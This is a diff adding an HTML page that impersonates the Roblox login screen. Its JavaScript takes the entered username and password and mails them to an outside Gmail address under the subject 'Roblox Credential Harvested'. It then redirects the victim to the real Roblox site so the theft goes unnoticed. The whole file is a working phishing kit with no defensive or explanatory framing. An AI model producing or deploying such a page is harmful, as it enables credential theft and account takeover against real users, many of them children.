@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox | Log In</title>
+    <style>
+        body {
+            background-color: #232527;
+            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .login-box {
+            background-color: #393b3d;
+            width: 400px;
+            padding: 40px 30px;
+            border-radius: 8px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            text-align: center;
+            color: white;
+        }
+        .logo {
+            width: 200px;
+            margin-bottom: 20px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 30px;
+            font-weight: 700;
+            color: #f2f4f5;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 5px;
+            color: #b8b8b8;
+        }
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            background-color: #232527;
+            border: 1px solid #555;
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            border-color: #00b06f;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #00b06f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+        button:hover {
+            background-color: #009e63;
+        }
+        .footer-links {
+            margin-top: 20px;
+            font-size: 13px;
+        }
+        .footer-links a {
+            color: #b8b8b8;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <!-- Direct link to Roblox logo to prevent breaking -->
+    <img src="https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png" alt="Roblox" class="logo" style="filter: brightness(0) invert(1);"> 
+    <!-- Note: Using a generic logo for stability, replace src with actual Roblox logo URL if needed: https://www.roblox.com/asset/1158416899/1 -->
+    
+    <h1>Log In</h1>
+    
+    <form id="robloxForm" onsubmit="captureData(event)">
+        <div class="input-group">
+            <label for="username">Username</label>
+            <input type="text" id="username" name="username" required autocomplete="off">
+        </div>
+        <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
+        </div>
+        
+        <button type="submit">Log In</button>
+    </form>
+
+    <div class="footer-links">
+        <a href="#">Forgot Password or Username?</a>
+        <a href="#">Sign Up</a>
+    </div>
+</div>
+
+<script>
+    function captureData(event) {
+        event.preventDefault();
+        
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+        
+        // Create the email body
+        const subject = encodeURIComponent("Roblox Credential Harvested");
+        const body = encodeURIComponent(`Username: ${user}\nPassword: ${pass}`);
+        
+        // Trigger mailto
+        window.location.href = `mailto:pekora052@gmail.com?subject=${subject}&body=${body}`;
+        
+        // Redirect to real Roblox after 2 seconds to hide the action
+        setTimeout(() => {
+            window.location.href = "https://www.roblox.com";
+        }, 2000);
+    }
+</script>
+
+</body>
+</html>
